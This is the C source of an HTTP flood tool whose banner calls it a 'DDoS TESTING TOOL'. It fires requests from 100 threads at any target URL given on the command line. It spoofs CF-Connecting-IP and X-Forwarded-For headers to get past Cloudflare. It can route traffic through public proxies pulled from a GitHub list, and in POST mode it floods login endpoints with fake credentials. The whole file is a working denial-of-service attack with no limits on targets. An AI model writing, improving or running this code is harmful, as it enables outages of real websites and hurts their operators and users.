#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>
#include <stdbool.h>
#include <errno.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <curl/curl.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/rand.h>

#define MAX_WORKERS 100  // Reduced significantly for stability
#define MAX_URL_LEN 8192
#define MAX_PROXIES 10000
#define POOL_SIZE 50     // Smaller pool
#define MAX_PAYLOAD_SIZE (10 * 1024 * 1024)

#define COLOR_RESET "\033[0m"
#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_MAGENTA "\033[35m"
#define COLOR_WHITE "\033[37m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_CYAN "\033[36m"
#define COLOR_BLUE "\033[34m"

typedef struct {
    char **proxies;
    int count;
    int index;
    pthread_mutex_t mutex;
} ProxyList;

typedef struct {
    CURL **handles;
    int size;
    int counter;
    pthread_mutex_t mutex;
    bool use_proxy;
    char target_host[256];
} ConnectionPool;

typedef struct {
    long long val;
    pthread_mutex_t mutex;
} AtomicCounter;

typedef struct {
    char target_url[1024];
    char target_host[256];
    int duration_sec;
    char mode[10];
    bool use_proxy;
    ConnectionPool *pool;
    int thread_id;
} AttackConfig;

ProxyList proxy_list = {0};
AtomicCounter stats = {0, PTHREAD_MUTEX_INITIALIZER};
AtomicCounter bytes_sent = {0, PTHREAD_MUTEX_INITIALIZER};
volatile bool running = true;
pthread_t workers[MAX_WORKERS];
pthread_t stats_thread;
time_t start_time;

// User agents
const char *USER_AGENTS[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13.5; rv:109.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    NULL
};

const char *REFERERS[] = {
    "https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/",
    "https://facebook.com/", "https://www.reddit.com/", "",
};

// Cloudflare IP prefixes
const char *CLOUDFLARE_PREFIXES[] = {"173.245.", "103.21.", "141.101.", "108.162.", "104.16.", "172.64."};

static size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    (void)contents;
    (void)userp;
    return size * nmemb;
}

int rand_int(int min, int max) {
    if (min >= max) return min;
    return min + (rand() % (max - min + 1));
}

bool rand_bool() {
    return rand() % 2 == 0;
}

char* random_string(int n) {
    const char letters[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    char *str = malloc(n + 1);
    if (!str) return NULL;
    for (int i = 0; i < n; i++) {
        str[i] = letters[rand() % (sizeof(letters) - 1)];
    }
    str[n] = '\0';
    return str;
}

char* random_hex(int n) {
    const char hex[] = "0123456789abcdef";
    char *str = malloc(n * 2 + 1);
    if (!str) return NULL;
    for (int i = 0; i < n; i++) {
        str[i*2] = hex[rand() % 16];
        str[i*2+1] = hex[rand() % 16];
    }
    str[n*2] = '\0';
    return str;
}

char* generate_cloudflare_ip() {
    char *ip = malloc(20);
    if (!ip) return NULL;
    int prefix_idx = rand_int(0, 5);
    snprintf(ip, 20, "%s%d.%d", CLOUDFLARE_PREFIXES[prefix_idx], rand_int(0, 255), rand_int(1, 254));
    return ip;
}

char* generate_student_number() {
    char *student = malloc(32);
    if (!student) return NULL;
    snprintf(student, 32, "%d-%05d", rand_int(2015, 2025), rand_int(1, 99999));
    return student;
}

char* generate_advanced_path() {
    char *result = malloc(MAX_URL_LEN);
    if (!result) return NULL;
    
    const char *paths[] = {
        "/", "/index.html", "/home", "/api/v1/users", "/wp-admin", 
        "/admin", "/login", "/dashboard", "/.env", "/config.json"
    };
    
    strcpy(result, paths[rand_int(0, 9)]);
    
    if (rand_int(1, 100) <= 70) {
        char bust[256];
        snprintf(bust, sizeof(bust), "?v=%d&_=%ld", rand_int(1, 1000000), time(NULL));
        strcat(result, bust);
    }
    
    return result;
}

void load_proxies_from_api() {
    CURL *curl = curl_easy_init();
    if (!curl) return;
    
    pthread_mutex_lock(&proxy_list.mutex);
    
    if (proxy_list.proxies) {
        for (int i = 0; i < proxy_list.count; i++) {
            if (proxy_list.proxies[i]) free(proxy_list.proxies[i]);
        }
        free(proxy_list.proxies);
        proxy_list.proxies = NULL;
    }
    
    proxy_list.proxies = malloc(sizeof(char*) * MAX_PROXIES);
    if (!proxy_list.proxies) {
        pthread_mutex_unlock(&proxy_list.mutex);
        curl_easy_cleanup(curl);
        return;
    }
    proxy_list.count = 0;
    
    const char *source = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt";
    
    curl_easy_setopt(curl, CURLOPT_URL, source);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    
    char response[65536] = {0};
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void*)response);
    
    CURLcode res = curl_easy_perform(curl);
    if (res == CURLE_OK) {
        char *line = strtok(response, "\n");
        while (line && proxy_list.count < MAX_PROXIES) {
            while (*line == ' ' || *line == '\r') line++;
            if (strlen(line) > 5 && strchr(line, ':')) {
                proxy_list.proxies[proxy_list.count] = strdup(line);
                if (proxy_list.proxies[proxy_list.count]) {
                    proxy_list.count++;
                }
            }
            line = strtok(NULL, "\n");
        }
    }
    
    curl_easy_cleanup(curl);
    pthread_mutex_unlock(&proxy_list.mutex);
    
    printf(COLOR_GREEN "[+] Loaded %d proxies\n" COLOR_RESET, proxy_list.count);
}

char* get_random_proxy() {
    pthread_mutex_lock(&proxy_list.mutex);
    if (proxy_list.count == 0) {
        pthread_mutex_unlock(&proxy_list.mutex);
        return NULL;
    }
    char *proxy = strdup(proxy_list.proxies[rand_int(0, proxy_list.count - 1)]);
    pthread_mutex_unlock(&proxy_list.mutex);
    return proxy;
}

void init_connection_pool(ConnectionPool *pool, int size, bool use_proxy, const char *host) {
    pool->handles = malloc(sizeof(CURL*) * size);
    pool->size = size;
    pool->counter = 0;
    pool->use_proxy = use_proxy;
    if (host) {
        strncpy(pool->target_host, host, 255);
        pool->target_host[255] = '\0';
    }
    pthread_mutex_init(&pool->mutex, NULL);
    
    printf(COLOR_YELLOW "[*] Creating connection pool with %d connections...\n" COLOR_RESET, size);
    
    for (int i = 0; i < size; i++) {
        pool->handles[i] = curl_easy_init();
        if (pool->handles[i]) {
            curl_easy_setopt(pool->handles[i], CURLOPT_TIMEOUT, 10L);
            curl_easy_setopt(pool->handles[i], CURLOPT_FOLLOWLOCATION, 0L);
            curl_easy_setopt(pool->handles[i], CURLOPT_SSL_VERIFYPEER, 0L);
            curl_easy_setopt(pool->handles[i], CURLOPT_SSL_VERIFYHOST, 0L);
            curl_easy_setopt(pool->handles[i], CURLOPT_NOSIGNAL, 1L);
        }
    }
    
    printf(COLOR_GREEN "[+] Connection pool ready!\n" COLOR_RESET);
}

void cleanup_connection_pool(ConnectionPool *pool) {
    if (!pool) return;
    
    pthread_mutex_lock(&pool->mutex);
    for (int i = 0; i < pool->size; i++) {
        if (pool->handles[i]) {
            curl_easy_cleanup(pool->handles[i]);
            pool->handles[i] = NULL;
        }
    }
    if (pool->handles) {
        free(pool->handles);
        pool->handles = NULL;
    }
    pthread_mutex_unlock(&pool->mutex);
    pthread_mutex_destroy(&pool->mutex);
    free(pool);
}

CURL* pool_get_client(ConnectionPool *pool) {
    pthread_mutex_lock(&pool->mutex);
    int idx = pool->counter % pool->size;
    pool->counter++;
    CURL *handle = pool->handles[idx];
    pthread_mutex_unlock(&pool->mutex);
    
    if (handle) {
        curl_easy_reset(handle);
        curl_easy_setopt(handle, CURLOPT_TIMEOUT, 10L);
        curl_easy_setopt(handle, CURLOPT_FOLLOWLOCATION, 0L);
        curl_easy_setopt(handle, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(handle, CURLOPT_SSL_VERIFYHOST, 0L);
        curl_easy_setopt(handle, CURLOPT_NOSIGNAL, 1L);
    }
    
    return handle;
}

void attack_request(const char *target, const char *mode, ConnectionPool *pool) {
    CURL *curl = pool_get_client(pool);
    if (!curl) return;
    
    char *path = generate_advanced_path();
    if (!path) return;
    
    char full_url[MAX_URL_LEN];
    snprintf(full_url, sizeof(full_url), "%s%s", target, path);
    
    struct curl_slist *headers = NULL;
    char header_buf[512];
    
    // Add headers
    snprintf(header_buf, sizeof(header_buf), "User-Agent: %s", USER_AGENTS[rand_int(0, 6)]);
    headers = curl_slist_append(headers, header_buf);
    
    if (rand_bool()) {
        snprintf(header_buf, sizeof(header_buf), "Referer: %s", REFERERS[rand_int(0, 4)]);
        headers = curl_slist_append(headers, header_buf);
    }
    
    // Cloudflare bypass
    if (rand_int(1, 100) <= 40) {
        char *cf_ip = generate_cloudflare_ip();
        if (cf_ip) {
            snprintf(header_buf, sizeof(header_buf), "CF-Connecting-IP: %s", cf_ip);
            headers = curl_slist_append(headers, header_buf);
            snprintf(header_buf, sizeof(header_buf), "X-Forwarded-For: %s", cf_ip);
            headers = curl_slist_append(headers, header_buf);
            free(cf_ip);
        }
    }
    
    headers = curl_slist_append(headers, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
    headers = curl_slist_append(headers, "Accept-Language: en-US,en;q=0.9");
    headers = curl_slist_append(headers, "Sec-Fetch-Dest: document");
    headers = curl_slist_append(headers, "Sec-Fetch-Mode: navigate");
    headers = curl_slist_append(headers, "Sec-Fetch-Site: none");
    headers = curl_slist_append(headers, "Upgrade-Insecure-Requests: 1");
    
    curl_easy_setopt(curl, CURLOPT_URL, full_url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    
    if (strcmp(mode, "POST") == 0) {
        char *student_num = generate_student_number();
        char post_data[256];
        snprintf(post_data, sizeof(post_data), "student_id=%s&password=test123", student_num);
        free(student_num);
        
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(post_data));
        curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "POST");
    } else {
        curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
        curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "GET");
    }
    
    if (pool->use_proxy) {
        char *proxy = get_random_proxy();
        if (proxy) {
            curl_easy_setopt(curl, CURLOPT_PROXY, proxy);
            curl_easy_setopt(curl, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
            free(proxy);
        }
    }
    
    curl_easy_perform(curl);
    
    // Update stats
    pthread_mutex_lock(&stats.mutex);
    stats.val++;
    pthread_mutex_unlock(&stats.mutex);
    
    pthread_mutex_lock(&bytes_sent.mutex);
    bytes_sent.val += strlen(full_url);
    pthread_mutex_unlock(&bytes_sent.mutex);
    
    curl_slist_free_all(headers);
    free(path);
}

void* worker_thread(void *arg) {
    AttackConfig *cfg = (AttackConfig*)arg;
    
    while (running) {
        attack_request(cfg->target_url, cfg->mode, cfg->pool);
    }
    
    return NULL;
}

void* stats_display(void *arg) {
    (void)arg;
    
    while (running) {
        sleep(1);
        
        time_t now = time(NULL);
        double elapsed = difftime(now, start_time);
        long long total_requests, total_bytes;
        
        pthread_mutex_lock(&stats.mutex);
        total_requests = stats.val;
        pthread_mutex_unlock(&stats.mutex);
        
        pthread_mutex_lock(&bytes_sent.mutex);
        total_bytes = bytes_sent.val;
        pthread_mutex_unlock(&bytes_sent.mutex);
        
        if (elapsed > 0.1) {
            double rps = (double)total_requests / elapsed;
            double mbps = ((double)total_bytes * 8.0) / (elapsed * 1000000.0);
            
            printf("\r\033[K");
            printf(COLOR_RED "[⚡] " COLOR_RESET);
            printf(COLOR_GREEN "RPS: %.0f " COLOR_RESET, rps);
            printf(COLOR_YELLOW "Total: %lld " COLOR_RESET, total_requests);
            printf(COLOR_CYAN "MB/s: %.1f " COLOR_RESET, mbps);
            printf(COLOR_MAGENTA "Workers: %d" COLOR_RESET, MAX_WORKERS);
            fflush(stdout);
        }
    }
    
    return NULL;
}

void signal_handler(int sig) {
    if (sig == SIGINT || sig == SIGTERM) {
        printf(COLOR_YELLOW "\n[!] Shutting down...\n" COLOR_RESET);
        running = false;
    }
}

void print_banner() {
    printf(COLOR_RED);
    printf("\n");
    printf("    ╔══════════════════════════════════════════════════════════════════════════╗\n");
    printf("    ║                                                                          ║\n");
    printf("    ║ ██████╗ █████╗ ███████╗███████╗██╗   ██╗██████╗ ██████╗  ██████╗ ███████╗ ║\n");
    printf("    ║██╔════╝██╔══██╗╚══███╔╝╚══███╔╝╚██╗ ██╔╝██╔══██╗██╔══██╗██╔═══██╗██╔════╝ ║\n");
    printf("    ║██║     ███████║  ███╔╝   ███╔╝  ╚████╔╝ ██║  ██║██║  ██║██║   ██║███████╗ ║\n");
    printf("    ║██║     ██╔══██║ ███╔╝   ███╔╝    ╚██╔╝  ██║  ██║██║  ██║██║   ██║╚════██║ ║\n");
    printf("    ║╚██████╗██║  ██║███████╗███████╗   ██║   ██████╔╝██████╔╝╚██████╔╝███████║ ║\n");
    printf("    ║ ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝   ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝ ║\n");
    printf("    ║                                                                          ║\n");
    printf("    ║                    DDoS TESTING TOOL v5.0                                ║\n");
    printf("    ║                                                                          ║\n");
    printf("    ╚══════════════════════════════════════════════════════════════════════════╝\n");
    printf(COLOR_RESET);
}

int main(int argc, char *argv[]) {
    if (argc < 4) {
        print_banner();
        printf("\n");
        printf(COLOR_RED "    Usage: %s <target> <seconds> <GET|POST> [proxy]\n" COLOR_RESET, argv[0]);
        printf(COLOR_CYAN "    Example: %s https://example.com 60 GET\n", argv[0]);
        printf(COLOR_CYAN "    Example: %s https://example.com 30 POST proxy\n", argv[0]);
        printf("\n");
        return 1;
    }
    
    // Seed random
    srand(time(NULL));
    
    AttackConfig *cfg = malloc(sizeof(AttackConfig));
    if (!cfg) {
        printf(COLOR_RED "[!] Failed to allocate config\n" COLOR_RESET);
        return 1;
    }
    memset(cfg, 0, sizeof(AttackConfig));
    
    strncpy(cfg->target_url, argv[1], 1023);
    cfg->target_url[1023] = '\0';
    cfg->duration_sec = atoi(argv[2]);
    strncpy(cfg->mode, argv[3], 9);
    cfg->mode[9] = '\0';
    cfg->use_proxy = (argc >= 5 && strcmp(argv[4], "proxy") == 0);
    
    // Parse host from URL
    char *url_copy = strdup(cfg->target_url);
    if (url_copy) {
        char *proto_end = strstr(url_copy, "://");
        char *host_start = proto_end ? proto_end + 3 : url_copy;
        char *path_start = strchr(host_start, '/');
        
        if (path_start) {
            size_t host_len = path_start - host_start;
            if (host_len < 256) {
                strncpy(cfg->target_host, host_start, host_len);
                cfg->target_host[host_len] = '\0';
            }
        } else {
            strncpy(cfg->target_host, host_start, 255);
            cfg->target_host[255] = '\0';
        }
        free(url_copy);
    }
    
    curl_global_init(CURL_GLOBAL_ALL);
    
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    if (cfg->use_proxy) {
        printf(COLOR_YELLOW "[*] Loading proxies...\n" COLOR_RESET);
        load_proxies_from_api();
    }
    
    ConnectionPool *connection_pool = malloc(sizeof(ConnectionPool));
    if (!connection_pool) {
        printf(COLOR_RED "[!] Failed to allocate connection pool\n" COLOR_RESET);
        free(cfg);
        return 1;
    }
    
    init_connection_pool(connection_pool, POOL_SIZE, cfg->use_proxy, cfg->target_host);
    
    print_banner();
    printf(COLOR_GREEN "\n    [🔥] Target: %s\n" COLOR_RESET, cfg->target_url);
    printf(COLOR_GREEN "    [⏱️] Duration: %d seconds\n" COLOR_RESET, cfg->duration_sec);
    printf(COLOR_GREEN "    [⚙️] Mode: %s\n" COLOR_RESET, cfg->mode);
    printf(COLOR_GREEN "    [🚀] Workers: %d\n" COLOR_RESET, MAX_WORKERS);
    printf(COLOR_GREEN "    [🔗] Pool Size: %d connections\n" COLOR_RESET, POOL_SIZE);
    if (cfg->use_proxy && proxy_list.count > 0) {
        printf(COLOR_GREEN "    [🌐] Proxies: %d\n" COLOR_RESET, proxy_list.count);
    }
    
    printf(COLOR_YELLOW "\n    [💀] LAUNCHING ATTACK... Press Ctrl+C to stop\n\n" COLOR_RESET);
    
    start_time = time(NULL);
    running = true;
    
    // Create worker threads
    AttackConfig *thread_args[MAX_WORKERS];
    for (int i = 0; i < MAX_WORKERS; i++) {
        thread_args[i] = malloc(sizeof(AttackConfig));
        if (thread_args[i]) {
            memcpy(thread_args[i], cfg, sizeof(AttackConfig));
            thread_args[i]->pool = connection_pool;
            thread_args[i]->thread_id = i;
            if (pthread_create(&workers[i], NULL, worker_thread, thread_args[i]) != 0) {
                printf(COLOR_RED "[!] Failed to create thread %d\n" COLOR_RESET, i);
            }
        }
    }
    
    pthread_create(&stats_thread, NULL, stats_display, NULL);
    
    // Wait for duration
    sleep(cfg->duration_sec);
    running = false;
    
    printf(COLOR_YELLOW "\n[!] Waiting for workers to finish...\n" COLOR_RESET);
    usleep(1000000); // 1 second
    
    // Join threads
    for (int i = 0; i < MAX_WORKERS; i++) {
        pthread_join(workers[i], NULL);
        if (thread_args[i]) {
            free(thread_args[i]);
        }
    }
    pthread_join(stats_thread, NULL);
    
    // Print results
    long long total_requests, total_bytes;
    pthread_mutex_lock(&stats.mutex);
    total_requests = stats.val;
    pthread_mutex_unlock(&stats.mutex);
    
    pthread_mutex_lock(&bytes_sent.mutex);
    total_bytes = bytes_sent.val;
    pthread_mutex_unlock(&bytes_sent.mutex);
    
    printf(COLOR_RED "\n\n    ╔════════════════════════════════════════════════════════════╗\n");
    printf(COLOR_RED "    ║                    ATTACK COMPLETED!                        ║\n");
    printf(COLOR_RED "    ╠════════════════════════════════════════════════════════════╣\n");
    printf(COLOR_CYAN "    ║  Total Requests: %-52lld ║\n", total_requests);
    printf(COLOR_CYAN "    ║  Total Data Sent: %-52.2f MB ║\n", total_bytes / (1024.0 * 1024.0));
    if (cfg->duration_sec > 0) {
        printf(COLOR_CYAN "    ║  Average RPS: %-55.0f ║\n", (double)total_requests / cfg->duration_sec);
    }
    printf(COLOR_RED "    ╚════════════════════════════════════════════════════════════╝\n");
    printf(COLOR_RESET);
    
    // Cleanup
    cleanup_connection_pool(connection_pool);
    
    if (proxy_list.proxies) {
        pthread_mutex_lock(&proxy_list.mutex);
        for (int i = 0; i < proxy_list.count; i++) {
            if (proxy_list.proxies[i]) {
                free(proxy_list.proxies[i]);
            }
        }
        free(proxy_list.proxies);
        proxy_list.proxies = NULL;
        pthread_mutex_unlock(&proxy_list.mutex);
    }
    
    pthread_mutex_destroy(&stats.mutex);
    pthread_mutex_destroy(&bytes_sent.mutex);
    pthread_mutex_destroy(&proxy_list.mutex);
    
    free(cfg);
    curl_global_cleanup();
    
    return 0;
}
